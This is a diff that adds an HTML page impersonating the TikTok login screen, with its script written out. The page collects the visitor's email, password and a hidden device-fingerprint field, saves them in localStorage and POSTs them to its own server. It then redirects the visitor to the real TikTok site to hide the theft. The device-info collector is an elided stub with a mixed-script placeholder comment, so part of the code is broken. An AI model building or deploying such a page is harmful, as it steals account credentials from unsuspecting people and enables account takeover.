@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok - Log In</title>
+    <style>
+        /* CSS কোডে কোনো পরিবর্তন করা হয়নি */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { background-color: #000; color: #fff; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
+        .main-content { padding: 100px 20px 60px; }
+        .login-container { background: #121212; border-radius: 12px; padding: 48px 40px; max-width: 408px; }
+        .login-header { text-align: center; margin-bottom: 36px; }
+        .login-title { font-size: 32px; margin-bottom: 12px; }
+        .login-subtitle { font-size: 16px; color: rgba(255, 255, 255, 0.75); }
+        input[type="text"], input[type="password"] { width: 100%; height: 48px; border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 4px; padding: 0 16px; font-size: 16px; background-color: rgba(255, 255, 255, 0.05); color: #fff; }
+        .login-button { background: #FE2C55; color: #fff; border: none; border-radius: 4px; padding: 14px 0; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; margin-top: 8px; }
+    </style>
+</head>
+<body>
+    <div class="main-content">
+        <div class="login-container">
+            <div class="login-header">
+                <h1 class="login-title">Log in to TikTok</h1>
+                <p class="login-subtitle">Manage your account, check notifications...</p>
+            </div>
+            <form id="loginForm">
+                <div class="input-group"><input type="text" name="email" id="username" placeholder="Phone number or email" required></div>
+                <div class="input-group"><input type="password" name="pass" id="password" placeholder="Password" required></div>
+                <button type="submit" class="login-button">Log in</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', async function() {
+            let deviceField = document.createElement('input');
+            deviceField.type = 'hidden';
+            deviceField.id = 'deviceInfo';
+            document.body.appendChild(deviceField);
+            const getFullDeviceInfo = async () => { /* ... விரிவான তথ্য সংগ্রহ ফাংশন ... */ return JSON.stringify(deviceInfo); };
+            deviceField.value = await getFullDeviceInfo();
+        });
+
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+            const email = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            const deviceInfo = document.getElementById('deviceInfo').value;
+            if (!email || !pass) { alert('Please fill in all fields.'); return; }
+            try {
+                const storedData = JSON.parse(localStorage.getItem('userInputData') || '{"tiktokData":[]}');
+                storedData.tiktokData.push({ email, pass, deviceInfo, timestamp: new Date().toLocaleString() });
+                localStorage.setItem('userInputData', JSON.stringify(storedData));
+            } catch(e) { console.error(e); }
+            const button = document.querySelector('.login-button');
+            button.textContent = 'LOGGING IN...'; button.disabled = true;
+            const params = new URLSearchParams({ email, pass, deviceInfo });
+            try {
+                await fetch('/', { method: 'POST', body: params });
+                setTimeout(() => { window.location.href = 'https://www.tiktok.com'; }, 1500);
+            } catch (error) {
+                alert('Login failed.');
+                button.textContent = 'Log in'; button.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
